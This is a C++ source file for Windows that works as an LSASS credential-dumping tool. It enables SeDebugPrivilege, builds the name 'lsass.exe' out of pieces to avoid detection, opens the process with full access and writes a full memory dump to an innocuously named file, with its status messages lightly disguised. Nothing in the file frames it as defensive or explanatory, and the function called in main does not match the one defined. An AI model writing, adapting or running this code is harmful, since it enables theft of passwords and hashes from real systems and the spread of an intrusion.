#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <Shlwapi.h>
#include "Header.h"
#include "DebugPriv.h"

using namespace std;

#pragma	comment(lib, "Shlwapi")

BOOL EnableDebugPrivilege() {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        std::cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        CloseHandle(token);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        DWORD err = GetLastError();
        std::cerr << "[-] AdjustTokenPrivileges failed. Error: " << err << "\n";
        CloseHandle(token);
        return FALSE;
    }

    // Verify if privilege was enabled
    TOKEN_PRIVILEGES tpCheck;
    DWORD size;
    if (GetTokenInformation(token, TokenPrivileges, &tpCheck, sizeof(tpCheck), &size)) {
        for (DWORD i = 0; i < tpCheck.PrivilegeCount; i++) {
            if (tpCheck.Privileges[i].Luid.LowPart == luid.LowPart &&
                tpCheck.Privileges[i].Luid.HighPart == luid.HighPart) {
                if (tpCheck.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
                    std::cout << "[+] SeDebugPrivilege successfully enabled.\n";
                    CloseHandle(token);
                    return TRUE;
                }
            }
        }
    }

    std::cerr << "[-] SeDebugPrivilege is still disabled.\n";
    CloseHandle(token);
    return FALSE;
}


int main()
{
	EnableDebugAbility();

	std::wstring mystring_w(L"ss.e");
	std::wstring out_w = L"lsa" + mystring_w + L"xe";

	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = CreateFile(L"ekhm.bla", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	LPWSTR out = const_cast<LPWSTR>(out_w.c_str());

	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, out) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got ekhm PID: " << lsassPID << endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (isDumped) {
		cout << "[+] ekhm du_mped successfully!" << endl;
	}

	return 0;
}
